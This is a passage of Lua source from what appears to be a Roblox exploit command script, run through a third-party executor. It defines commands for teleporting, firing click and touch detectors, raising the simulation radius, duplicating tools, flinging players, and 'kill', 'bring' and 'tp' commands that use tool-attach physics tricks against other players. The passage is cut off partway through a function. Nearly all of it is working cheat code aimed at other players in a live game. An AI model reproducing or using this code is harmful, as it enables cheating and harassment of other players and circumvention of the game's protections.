			if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				getRoot(speaker.Character).CFrame = v.CFrame
			end
		end
	end)

	addcmd('tweengotopartclass',{'tgpc'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.ClassName:lower() == getstring(1):lower() and v:IsA("BasePart") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v.CFrame}):Play()
			end
		end
	end)

	addcmd('gotomodel',{'tomodel'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("Model") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				getRoot(speaker.Character).CFrame = v:GetModelCFrame()
			end
		end
	end)

	addcmd('tweengotomodel',{'tgotomodel','ttomodel'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v.Name:lower() == getstring(1):lower() and v:IsA("Model") then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				wait(gotopartDelay)
				game:GetService("TweenService"):Create(getRoot(speaker.Character), TweenInfo.new(tweenSpeed, Enum.EasingStyle.Linear), {CFrame = v:GetModelCFrame()}):Play()
			end
		end
	end)

	addcmd('gotopartdelay',{},function(args, speaker)
		local gtpDelay = args[1] or 0.1
		if isNumber(gtpDelay) then
			gotopartDelay = gtpDelay
		end
	end)

	addcmd('noclickdetectorlimits',{'nocdlimits','removecdlimits'},function(args, speaker)
		for i,v in pairs(workspace:GetDescendants()) do
			if v:IsA("ClickDetector") then
				v.MaxActivationDistance = math.huge
			end
		end
	end)

	addcmd('fireclickdetectors',{'firecd','firecds'},function(args, speaker)
		if fireclickdetector then
			for i,v in pairs(workspace:GetDescendants()) do
				if v:IsA("ClickDetector") then
					fireclickdetector(v)
				end
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing fireclickdetector)')
		end
	end)

	simRadius = false
	addcmd('simulationradius',{'simradius'},function(args, speaker)
		if sethidden then		
			simRadLoop = game:GetService('RunService').Stepped:Connect(function()
				if setsimulation then
					setsimulation(1e308, 1/0)
				else	
					sethidden(speaker,"MaximumSimulationRadius",1/0)
					sethidden(speaker,"SimulationRadius", 1e308)
				end
			end)
			simRadius = true
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('nosimulationradius',{'nosimradius','unsimradius'},function(args, speaker)
		if sethidden then		
			if simRadLoop then simRadLoop:Disconnect() end
			wait()
			if setsimulation then
				setsimulation(139,139)
			else	
				sethidden(speaker,"MaximumSimulationRadius",139)
				sethidden(speaker,"SimulationRadius", 139)
			end
			simRadius = false
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing sethiddenproperty)')
		end
	end)

	addcmd('grabtools', {}, function(args, speaker)
		local Human = speaker.Character:FindFirstChildWhichIsA("Humanoid")
		for _, v in ipairs(workspace:GetChildren()) do
			if speaker.Character and v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
				Human:EquipTool(v)
			end
		end
		if grabtoolsFunc then grabtoolsFunc:Disconnect() end
		grabtoolsFunc = workspace.ChildAdded:Connect(function(v)
			if speaker.Character and v:IsA("BackpackItem") and v:FindFirstChild("Handle") then
				speaker.Character:WaitForChild("Humanoid"):EquipTool(v)
			end
		end)
		notify('Grabtools', 'Picking up any dropped tools')
	end)

	addcmd('nograbtools',{'ungrabtools'},function(args, speaker)
		if grabtoolsFunc then grabtoolsFunc:Disconnect() end
		notify('Grabtools','Grabtools has been disabled')
	end)

	addcmd('light',{},function(args, speaker)
		local light = Instance.new("PointLight")
		light.Parent = getRoot(speaker.Character)
		light.Range = 30
		if args[1] then
			light.Brightness = args[2]
			light.Range = args[1]
		else
			light.Brightness = 5
		end
	end)

	addcmd('unlight',{'nolight'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v.ClassName == "PointLight" then
				v:Destroy()
			end
		end
	end)

	addcmd('copytools',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players)do
			spawn(function()
				for i,v in pairs(Players[v]:FindFirstChildOfClass("Backpack"):GetChildren()) do
					if v:IsA('Tool') or v:IsA('HopperBin') then
						v:Clone().Parent = speaker:FindFirstChildOfClass("Backpack")
					end
				end
			end)
		end
	end)

	addcmd('naked',{},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Clothing") or v:IsA("ShirtGraphic") then
				v:Destroy()
			end
		end
	end)

	addcmd('noface',{'removeface'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Decal") and v.Name == 'face' then
				v:Destroy()
			end
		end
	end)

	addcmd('spawnpoint',{'spawn'},function(args, speaker)
		spawnpos = getRoot(speaker.Character).CFrame
		spawnpoint = true
		spDelay = tonumber(args[1]) or 0.1
		notify('Spawn Point','Spawn point created at '..tostring(spawnpos))
	end)

	addcmd('nospawnpoint',{'nospawn','removespawnpoint'},function(args, speaker)
		spawnpoint = false
		notify('Spawn Point','Removed spawn point')
	end)

	addcmd('flashback',{'diedtp'},function(args, speaker)
		if lastDeath ~= nil then
			if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
				speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
				wait(.1)
			end
			getRoot(speaker.Character).CFrame = lastDeath
		end
	end)

	addcmd('hatspin',{'spinhats'},function(args, speaker)
		execCmd('unhatspin')
		wait(.5)
		for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
			local keep = Instance.new("BodyPosition") keep.Name = randomString() keep.Parent = v.Handle
			local spin = Instance.new("BodyAngularVelocity") spin.Name = randomString() spin.Parent = v.Handle
			v.Handle:FindFirstChildOfClass("Weld"):Destroy()
			if args[1] then
				spin.AngularVelocity = Vector3.new(0, args[1], 0)
				spin.MaxTorque = Vector3.new(0, args[1] * 2, 0)
			else
				spin.AngularVelocity = Vector3.new(0, 100, 0)
				spin.MaxTorque = Vector3.new(0, 200, 0)
			end
			keep.P = 30000
			keep.D = 50
			spinhats = game:GetService('RunService').Stepped:Connect(function()
				pcall(function()
					keep.Position = Players.LocalPlayer.Character.Head.Position
				end)
			end)
		end
	end)

	addcmd('unhatspin',{'unspinhats'},function(args, speaker)
		if spinhats then
			spinhats:Disconnect()
		end
		for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
			v.Parent = workspace
			for i,c in pairs(v.Handle) do
				if c:IsA("BodyPosition") or c:IsA("BodyAngularVelocity") then
					c:Destroy()
				end
			end
			wait()
			v.Parent = speaker.Character
		end
	end)

	addcmd('clearhats',{'cleanhats'},function(args, speaker)
		if firetouchinterest then
			local Player = Players.LocalPlayer
			local Character = Player.Character
			local Old = Character:FindFirstChild("HumanoidRootPart").CFrame
			local Hats = {}
			for _,x in next, workspace:GetChildren() do
				if x:IsA("Accessory") then
					table.insert(Hats,x)
				end
			end
			for _,getacc in next, Character:FindFirstChild("Humanoid"):GetAccessories() do
				getacc:Destroy()
			end
			for i = 1,#Hats do
				repeat game:GetService("RunService").Heartbeat:wait() until Hats[i]
				firetouchinterest(Hats[i].Handle,Character:FindFirstChild("HumanoidRootPart"),0)
				repeat game:GetService("RunService").Heartbeat:wait() until Character:FindFirstChildOfClass("Accessory")
				Character:FindFirstChildOfClass("Accessory"):Destroy()
				repeat game:GetService("RunService").Heartbeat:wait() until not Character:FindFirstChildOfClass("Accessory")
			end
			Character:BreakJoints()
			Player.CharacterAdded:wait()
			for i = 1,20 do game:GetService("RunService").Heartbeat:wait()
				if Player.Character:FindFirstChild("HumanoidRootPart") then
					Player.Character:FindFirstChild("HumanoidRootPart").CFrame = Old
				end
			end
		else
			notify('Incompatible Exploit','Your exploit does not support this command (missing firetouchinterest)')
		end
	end)

	addcmd('split',{},function(args, speaker)
		if r15(speaker) then
			speaker.Character.UpperTorso.Waist:Destroy()
		else
			notify('R15 Required','This command requires the r15 rig type')
		end
	end)

	addcmd('nilchar',{},function(args, speaker)
		if speaker.Character ~= nil then
			speaker.Character.Parent = nil
		end
	end)

	addcmd('unnilchar',{'nonilchar'},function(args, speaker)
		if speaker.Character ~= nil then
			speaker.Character.Parent = workspace
		end
	end)

	addcmd('noroot',{'removeroot','rroot'},function(args, speaker)
		if speaker.Character ~= nil then
			local char = Players.LocalPlayer.Character
			char.Parent = nil
			char.HumanoidRootPart:Destroy()
			char.Parent = workspace
		end
	end)

	addcmd('replaceroot',{'replacerootpart'},function(args, speaker)
		if speaker.Character ~= nil and speaker.Character:FindFirstChild("HumanoidRootPart") then
			local Char = speaker.Character
			local OldParent = Char.Parent
			local HRP = Char and Char:FindFirstChild("HumanoidRootPart")
			local OldPos = HRP.CFrame
			Char.Parent = game
			local HRP1 = HRP:Clone()
			HRP1.Parent = Char
			HRP = HRP:Destroy()
			HRP1.CFrame = OldPos
			Char.Parent = OldParent
		end
	end)

	addcmd('clearcharappearance',{'clearchar','clrchar'},function(args, speaker)
		speaker:ClearCharacterAppearance()
	end)

	addcmd('equiptools',{},function(args, speaker)
		for i,v in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
			if v:IsA("Tool") or v:IsA("HopperBin") then
				v.Parent = speaker.Character
			end
		end
	end)

	local function GetHandleTools(p)
		p = p or Players.LocalPlayer
		local r = {}
		for _, v in ipairs(p.Character and p.Character:GetChildren() or {}) do
			if v.IsA(v, "BackpackItem") and v.FindFirstChild(v, "Handle") then
				r[#r + 1] = v
			end
		end
		for _, v in ipairs(p.Backpack:GetChildren()) do
			if v.IsA(v, "BackpackItem") and v.FindFirstChild(v, "Handle") then
				r[#r + 1] = v
			end
		end
		return r
	end
	addcmd('dupetools', {'clonetools'}, function(args, speaker)
		local LOOP_NUM = tonumber(args[1]) or 1
		local OrigPos = speaker.Character.HumanoidRootPart.Position
		local Tools, TempPos = {}, Vector3.new(math.random(-2e5, 2e5), 2e5, math.random(-2e5, 2e5))
		for i = 1, LOOP_NUM do
			local Human = speaker.Character:WaitForChild("Humanoid")
			wait(.1, Human.Parent:MoveTo(TempPos))
			Human.RootPart.Anchored = speaker:ClearCharacterAppearance(wait(.1)) or true
			local t = GetHandleTools(speaker)
			while #t > 0 do
				for _, v in ipairs(t) do
					coroutine.wrap(function()
						for _ = 1, 25 do
							v.Parent = speaker.Character
							v.Handle.Anchored = true
						end
						for _ = 1, 5 do
							v.Parent = workspace
						end
						table.insert(Tools, v.Handle)
					end)()
				end
				t = GetHandleTools(speaker)
			end
			wait(.1)
			speaker.Character = speaker.Character:Destroy()
			speaker.CharacterAdded:Wait():WaitForChild("Humanoid").Parent:MoveTo(LOOP_NUM == i and OrigPos or TempPos, wait(.1))
			if i == LOOP_NUM or i % 5 == 0 then
				local HRP = speaker.Character.HumanoidRootPart
				if type(firetouchinterest) == "function" then
					for _, v in ipairs(Tools) do
						v.Anchored = not firetouchinterest(v, HRP, 1, firetouchinterest(v, HRP, 0)) and false or false
					end
				else
					for _, v in ipairs(Tools) do
						coroutine.wrap(function()
							local x = v.CanCollide
							v.CanCollide = false
							v.Anchored = false
							for _ = 1, 10 do
								v.CFrame = HRP.CFrame
								wait()
							end
							v.CanCollide = x
						end)()
					end
				end
				wait(.1)
				Tools = {}
			end
			TempPos = TempPos + Vector3.new(10, math.random(-5, 5), 0)
		end
	end)

	addcmd('touchinterests', {'touchinterest', 'firetouchinterests', 'firetouchinterest'}, function(args, speaker)
		local Root = getRoot(speaker.Character) or speaker.Character:FindFirstChildWhichIsA("BasePart")
		local function Touch(x)
			x = x.FindFirstAncestorWhichIsA(x, "Part")
			if x then
				if firetouchinterest then
					return spawn(function()
						firetouchinterest(x, Root, 1, wait() and firetouchinterest(x, Root, 0))
					end)
				end
				x.CFrame = Root.CFrame
			end
		end
		for _, v in ipairs(workspace:GetDescendants()) do
			if v.IsA(v, "TouchTransmitter") then
				Touch(v)
			end
		end
	end)

	addcmd('fullbright',{'fb','fullbrightness'},function(args, speaker)
		game:GetService("Lighting").Brightness = 2
		game:GetService("Lighting").ClockTime = 14
		game:GetService("Lighting").FogEnd = 100000
		game:GetService("Lighting").GlobalShadows = false
		game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
	end)

	addcmd('loopfullbright',{'loopfb'},function(args, speaker)
		if brightLoop then
			brightLoop:Disconnect()
		end
		local function brightFunc()
			game:GetService("Lighting").Brightness = 2
			game:GetService("Lighting").ClockTime = 14
			game:GetService("Lighting").FogEnd = 100000
			game:GetService("Lighting").GlobalShadows = false
			game:GetService("Lighting").OutdoorAmbient = Color3.fromRGB(128, 128, 128)
		end

		brightLoop = game:GetService("RunService").RenderStepped:Connect(brightFunc)
	end)

	addcmd('unloopfullbright',{'unloopfb'},function(args, speaker)
		if brightLoop then
			brightLoop:Disconnect()
		end
	end)

	addcmd('ambient',{},function(args, speaker)
		game:GetService("Lighting").Ambient = Color3.new(args[1],args[2],args[3])
		game:GetService("Lighting").OutdoorAmbient = Color3.new(args[1],args[2],args[3])
	end)

	addcmd('day',{},function(args, speaker)
		game:GetService("Lighting").ClockTime = 14
	end)

	addcmd('night',{},function(args, speaker)
		game:GetService("Lighting").ClockTime = 0
	end)

	addcmd('nofog',{},function(args, speaker)
		game:GetService("Lighting").FogEnd = 100000
	end)

	addcmd('brightness',{},function(args, speaker)
		game:GetService("Lighting").Brightness = args[1]
	end)

	addcmd('globalshadows',{'gshadows'},function(args, speaker)
		game:GetService("Lighting").GlobalShadows = true
	end)

	addcmd('unglobalshadows',{'nogshadows','ungshadows','noglobalshadows'},function(args, speaker)
		game:GetService("Lighting").GlobalShadows = false
	end)

	origsettings = {abt = game:GetService("Lighting").Ambient, oabt = game:GetService("Lighting").OutdoorAmbient, brt = game:GetService("Lighting").Brightness, time = game:GetService("Lighting").ClockTime, fe = game:GetService("Lighting").FogEnd, fs = game:GetService("Lighting").FogStart, gs = game:GetService("Lighting").GlobalShadows}

	addcmd('restorelighting',{'rlighting'},function(args, speaker)
		game:GetService("Lighting").Ambient = origsettings.abt
		game:GetService("Lighting").OutdoorAmbient = origsettings.oabt
		game:GetService("Lighting").Brightness = origsettings.brt
		game:GetService("Lighting").ClockTime = origsettings.time
		game:GetService("Lighting").FogEnd = origsettings.fe
		game:GetService("Lighting").FogStart = origsettings.fs
		game:GetService("Lighting").GlobalShadows = origsettings.gs
	end)

	addcmd('stun',{'platformstand'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = true
	end)

	addcmd('unstun',{'nostun','unplatformstand','noplatformstand'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').PlatformStand = false
	end)

	addcmd('norotate',{'noautorotate'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').AutoRotate  = false
	end)

	addcmd('unnorotate',{'autorotate'},function(args, speaker)
		speaker.Character:FindFirstChildOfClass('Humanoid').AutoRotate  = true
	end)

	addcmd('enablestate',{},function(args, speaker)
		local x = args[1]
		if not tonumber(x) then
			local x = Enum.HumanoidStateType[args[1]]
		end
		speaker.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(x, true)
	end)

	addcmd('disablestate',{},function(args, speaker)
		local x = args[1]
		if not tonumber(x) then
			local x = Enum.HumanoidStateType[args[1]]
		end
		speaker.Character:FindFirstChildOfClass("Humanoid"):SetStateEnabled(x, false)
	end)

	addcmd('drophats',{'drophat'},function(args, speaker)
		if speaker.Character then
			for _,v in pairs(speaker.Character.Humanoid:GetAccessories()) do
				v.Parent = workspace
			end
		end
	end)

	addcmd('deletehats',{'nohats','rhats'},function(args, speaker)
		if speaker.Character then
			speaker.Character:FindFirstChildOfClass("Humanoid"):RemoveAccessories()
		end
	end)

	addcmd('droptools',{'droptool'},function(args, speaker)
		for i,v in pairs(Players.LocalPlayer.Backpack:GetChildren()) do
			if v:IsA("Tool") then
				v.Parent = Players.LocalPlayer.Character
			end
		end
		wait()
		for i,v in pairs(Players.LocalPlayer.Character:GetChildren()) do
			if v:IsA("Tool") then
				v.Parent = workspace
			end
		end
	end)

	addcmd('droppabletools',{},function(args, speaker)
		if speaker.Character then
			for _,obj in pairs(speaker.Character:GetChildren()) do
				if obj:IsA("Tool") then
					obj.CanBeDropped = true
				end
			end
		end
		if speaker:FindFirstChildOfClass("Backpack") then
			for _,obj in pairs(speaker:FindFirstChildOfClass("Backpack"):GetChildren()) do
				if obj:IsA("Tool") then
					obj.CanBeDropped = true
				end
			end
		end
	end)

	local currentToolSize = ""
	local currentGripPos = ""
	addcmd('reach',{},function(args, speaker)
		execCmd('unreach')
		wait()
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Tool") then
				if args[1] then
					currentToolSize = v.Handle.Size
					currentGripPos = v.GripPos
					local a = Instance.new("SelectionBox")
					a.Name = "SelectionBoxCreated"
					a.Parent = v.Handle
					a.Adornee = v.Handle
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(0.5,0.5,args[1])
					v.GripPos = Vector3.new(0,0,0)
					speaker.Character.Humanoid:UnequipTools()
				else
					currentToolSize = v.Handle.Size
					currentGripPos = v.GripPos
					local a = Instance.new("SelectionBox")
					a.Name = "SelectionBoxCreated"
					a.Parent = v.Handle
					a.Adornee = v.Handle
					v.Handle.Massless = true
					v.Handle.Size = Vector3.new(0.5,0.5,60)
					v.GripPos = Vector3.new(0,0,0)
					speaker.Character.Humanoid:UnequipTools()
				end
			end
		end
	end)

	addcmd('unreach',{'noreach'},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Handle.Size = currentToolSize
				v.GripPos = currentGripPos
				v.Handle.SelectionBoxCreated:Destroy()
			end
		end
	end)

	addcmd('grippos',{},function(args, speaker)
		for i,v in pairs(speaker.Character:GetDescendants()) do
			if v:IsA("Tool") then
				v.Parent = speaker:FindFirstChildOfClass("Backpack")
				v.GripPos = Vector3.new(args[1],args[2],args[3])
				v.Parent = speaker.Character
			end
		end
	end)

	addcmd('usetools', {}, function(args, speaker)
		local Backpack = speaker:FindFirstChildOfClass("Backpack")
		local ammount = tonumber(args[1]) or 1
		local delay_ = tonumber(args[2]) or false
		for _, v in ipairs(Backpack:GetChildren()) do
			v.Parent = speaker.Character
			coroutine.wrap(function()
				for _ = 1, ammount do
					v:Activate()
					if delay_ then
						wait(delay_)
					end
				end
				v.Parent = Backpack
			end)()
		end
	end)

	addcmd('logs',{},function(args, speaker)
		logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
	end)

	addcmd('chatlogs',{'clogs'},function(args, speaker)
		join.Visible = false
		chat.Visible = true
		table.remove(shade3,table.find(shade3,selectChat))
		table.remove(shade2,table.find(shade2,selectJoin))
		table.insert(shade2,selectChat)
		table.insert(shade3,selectJoin)
		selectJoin.BackgroundColor3 = currentShade3
		selectChat.BackgroundColor3 = currentShade2
		logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
	end)

	addcmd('joinlogs',{'jlogs'},function(args, speaker)
		chat.Visible = false
		join.Visible = true	
		table.remove(shade3,table.find(shade3,selectJoin))
		table.remove(shade2,table.find(shade2,selectChat))
		table.insert(shade2,selectJoin)
		table.insert(shade3,selectChat)
		selectChat.BackgroundColor3 = currentShade3
		selectJoin.BackgroundColor3 = currentShade2
		logs:TweenPosition(UDim2.new(0, 0, 1, -265), "InOut", "Quart", 0.3, true, nil)
	end)

	flinging = false
	addcmd('fling',{},function(args, speaker)
		for _, child in pairs(speaker.Character:GetDescendants()) do
			if child:IsA("BasePart") then
				child.CustomPhysicalProperties = PhysicalProperties.new(2, 0.3, 0.5)
			end
		end
		execCmd('noclip nonotify')
		wait(.1)
		local bambam = Instance.new("BodyAngularVelocity")
		bambam.Name = randomString()
		bambam.Parent = getRoot(speaker.Character)
		bambam.AngularVelocity = Vector3.new(0,311111,0)
		bambam.MaxTorque = Vector3.new(0,311111,0)
		bambam.P = math.huge
		local function PauseFling()
			if speaker.Character:FindFirstChildOfClass("Humanoid") then
				if speaker.Character:FindFirstChildOfClass("Humanoid").FloorMaterial == Enum.Material.Air then
					bambam.AngularVelocity = Vector3.new(0,0,0)
				else
					bambam.AngularVelocity = Vector3.new(0,311111,0)
				end
			end
		end
		if TouchingFloor then
			TouchingFloor:Disconnect()
		end
		if TouchingFloorReset then
			TouchingFloorReset:Disconnect()
		end
		TouchingFloor = speaker.Character:FindFirstChildOfClass("Humanoid"):GetPropertyChangedSignal("FloorMaterial"):Connect(PauseFling)
		flinging = true
		local function flingDied()
			execCmd('unfling')
		end
		TouchingFloorReset = speaker.Character:FindFirstChildOfClass('Humanoid').Died:Connect(flingDied)
	end)

	addcmd('unfling',{'nofling'},function(args, speaker)
		execCmd('clip nonotify')
		if TouchingFloor then
			TouchingFloor:Disconnect()
		end
		if TouchingFloorReset then
			TouchingFloorReset:Disconnect()
		end
		flinging = false
		wait(.1)
		local speakerChar = speaker.Character
		if not speakerChar or not getRoot(speakerChar) then return end
		for i,v in pairs(getRoot(speakerChar):GetChildren()) do
			if v.ClassName == 'BodyAngularVelocity' then
				v:Destroy()
			end
		end
		for _, child in pairs(speakerChar:GetDescendants()) do
			if child.ClassName == "Part" or child.ClassName == "MeshPart" then
				child.CustomPhysicalProperties = PhysicalProperties.new(0.7, 0.3, 0.5)
			end
		end
	end)

	addcmd('togglefling',{},function(args, speaker)
		if flinging then
			execCmd('unfling')
		else
			execCmd('fling')
		end
	end)

	addcmd('invisfling',{},function(args, speaker)
		local ch = speaker.Character
		local prt=Instance.new("Model")
		prt.Parent = speaker.Character
		local z1 = Instance.new("Part")
		z1.Name="Torso"
		z1.CanCollide = false
		z1.Anchored = true
		local z2 = Instance.new("Part")
		z2.Name="Head"
		z2.Parent = prt
		z2.Anchored = true
		z2.CanCollide = false
		local z3 =Instance.new("Humanoid")
		z3.Name="Humanoid"
		z3.Parent = prt
		z1.Position = Vector3.new(0,9999,0)
		speaker.Character=prt
		wait(3)
		speaker.Character=ch
		wait(3)
		local Hum = Instance.new("Humanoid")
		z2:Clone()
		Hum.Parent = speaker.Character
		local root =  getRoot(speaker.Character)
		for i,v in pairs(speaker.Character:GetChildren()) do
			if v ~= root and  v.Name ~= "Humanoid" then
				v:Destroy()
			end
		end
		root.Transparency = 0
		root.Color = Color3.new(1, 1, 1)
		local invisflingStepped
		invisflingStepped = game:GetService('RunService').Stepped:Connect(function()
			if speaker.Character and getRoot(speaker.Character) then
				getRoot(speaker.Character).CanCollide = false
			else
				invisflingStepped:Disconnect()
			end
		end)
		sFLY()
		workspace.CurrentCamera.CameraSubject = root
		local bambam = Instance.new("BodyThrust")
		bambam.Parent = getRoot(speaker.Character)
		bambam.Force = Vector3.new(99999,99999*10,99999)
		bambam.Location = getRoot(speaker.Character).Position
	end)

	function attach(speaker,target)
		if tools(speaker) then
			local char = speaker.Character
			local tchar = target.Character
			local hum = speaker.Character:FindFirstChildOfClass("Humanoid")
			local hrp = getRoot(speaker.Character)
			local hrp2 = getRoot(target.Character)
			hum.Name = "1"
			local newHum = hum:Clone()
			newHum.Parent = char
			newHum.Name = "Humanoid"
			wait()
			hum:Destroy()
			workspace.CurrentCamera.CameraSubject = char
			newHum.DisplayDistanceType = "None"
			local tool = speaker:FindFirstChildOfClass("Backpack"):FindFirstChildOfClass("Tool") or speaker.Character:FindFirstChildOfClass("Tool")
			tool.Parent = char
			hrp.CFrame = hrp2.CFrame * CFrame.new(0, 0, 0) * CFrame.new(math.random(-100, 100)/200,math.random(-100, 100)/200,math.random(-100, 100)/200)
			local n = 0
			repeat
				wait(.1)
				n = n + 1
				hrp.CFrame = hrp2.CFrame
			until (tool.Parent ~= char or not hrp or not hrp2 or not hrp.Parent or not hrp2.Parent or n > 250) and n > 2
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('attach',{},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			attach(speaker,Players[v])
		end
	end)

	function kill(speaker,target,fast)
		if tools(speaker) then
			if target ~= nil then
				local NormPos = getRoot(speaker.Character).CFrame
				if not fast then
					refresh(speaker)
					wait()
					repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
					wait(0.3)
				end
				local hrp = getRoot(speaker.Character)
				attach(speaker,target)
				repeat
					wait()
					hrp.CFrame = CFrame.new(999999, workspace.FallenPartsDestroyHeight + 5,999999)
				until not getRoot(target.Character) or not getRoot(speaker.Character)
				wait(1)
				speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
			end
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('kill',{'fekill'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			kill(speaker,Players[v])
		end
	end)

	addcmd('handlekill', {'hkill'}, function(args, speaker)
		if not firetouchinterest then
			return notify('Incompatible Exploit', 'Your exploit does not support this command (missing firetouchinterest)')
		end
		local RS = game:GetService("RunService").RenderStepped
		local Tool = speaker.Character.FindFirstChildWhichIsA(speaker.Character, "Tool")
		local Handle = Tool and Tool.FindFirstChild(Tool, "Handle")
		if not Tool or not Handle then
			return notify("Handle Kill", "You need to hold a \"Tool\" that does damage on touch. For example the default \"Sword\" tool.")
		end
		for _, v in ipairs(getPlayer(args[1], speaker)) do
			v = Players[v]
			spawn(function()
				while Tool and speaker.Character and v.Character and Tool.Parent == speaker.Character do
					local Human = v.Character.FindFirstChildWhichIsA(v.Character, "Humanoid")
					if not Human or Human.Health <= 0 then
						break
					end
					for _, v1 in ipairs(v.Character.GetChildren(v.Character)) do
						v1 = ((v1.IsA(v1, "BasePart") and firetouchinterest(Handle, v1, 1, (RS.Wait(RS) and nil) or firetouchinterest(Handle, v1, 0)) and nil) or v1) or v1
					end
				end
				notify("Handle Kill Stopped!", v.Name .. " died/left or you unequiped the tool!")
			end)
		end
	end)

	local hb = game:GetService("RunService").Heartbeat
	addcmd('tpwalk', {'teleportwalk'}, function(args, speaker)
		tpwalking = true
		local chr = speaker.Character
		local hum = chr and chr:FindFirstChildWhichIsA("Humanoid")
		while tpwalking and hb:Wait() and chr and hum and hum.Parent do
			if hum.MoveDirection.Magnitude > 0 then
				chr:TranslateBy(hum.MoveDirection)
			end
		end
	end)
	addcmd('untpwalk', {'unteleportwalk'}, function(args, speaker)
		tpwalking = false
	end)

	addcmd('fastkill',{'fastfekill'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			kill(speaker,Players[v],true)
		end
	end)

	function bring(speaker,target,fast)
		if tools(speaker) then
			if target ~= nil then
				local NormPos = getRoot(speaker.Character).CFrame
				if not fast then
					refresh(speaker)
					wait()
					repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
					wait(0.3)
				end
				local hrp = getRoot(speaker.Character)
				attach(speaker,target)
				repeat
					wait()
					hrp.CFrame = NormPos
				until not getRoot(target.Character) or not getRoot(speaker.Character)
				wait(1)
				speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
			end
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('bring',{'febring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			bring(speaker,Players[v])
		end
	end)

	addcmd('fastbring',{'fastfebring'},function(args, speaker)
		local players = getPlayer(args[1], speaker)
		for i,v in pairs(players) do
			bring(speaker,Players[v],true)
		end
	end)

	function teleport(speaker,target,target2,fast)
		if tools(speaker) then
			if target ~= nil then
				local NormPos = getRoot(speaker.Character).CFrame
				if not fast then
					refresh(speaker)
					wait()
					repeat wait() until speaker.Character ~= nil and getRoot(speaker.Character)
					wait(0.3)
				end
				local hrp = getRoot(speaker.Character)
				local hrp2 = getRoot(target2.Character)
				attach(speaker,target)
				repeat
					wait()
					hrp.CFrame = hrp2.CFrame
				until not getRoot(target.Character) or not getRoot(speaker.Character)
				wait(1)
				speaker.CharacterAdded:Wait():WaitForChild("HumanoidRootPart").CFrame = NormPos
			end
		else
			notify('Tool Required','You need to have an item in your inventory to use this command')
		end
	end

	addcmd('tp',{'teleport'},function(args, speaker)
		local players1=getPlayer(args[1], speaker)
		local players2=getPlayer(args[2], speaker)
		for i,v in pairs(players1)do
			if getRoot(Players[v].Character) and getRoot(Players[players2[1]].Character) then
				if speaker.Character:FindFirstChildOfClass('Humanoid') and speaker.Character:FindFirstChildOfClass('Humanoid').SeatPart then
					speaker.Character:FindFirstChildOfClass('Humanoid').Sit = false
					wait(.1)
				end
				teleport(speaker,Players[v],Players[players2[1]])
			end
		end
	end)

	addcmd('fasttp',{'fastteleport'},function(args, speaker)
		local players1=getPlayer(args[1], speaker)
		local players2=getPlayer(args[2], speaker)
		for i,v in pairs(players1)do
			if getRoot(Players[v].Character) and getRoot(Players[players2[1]].Character) then
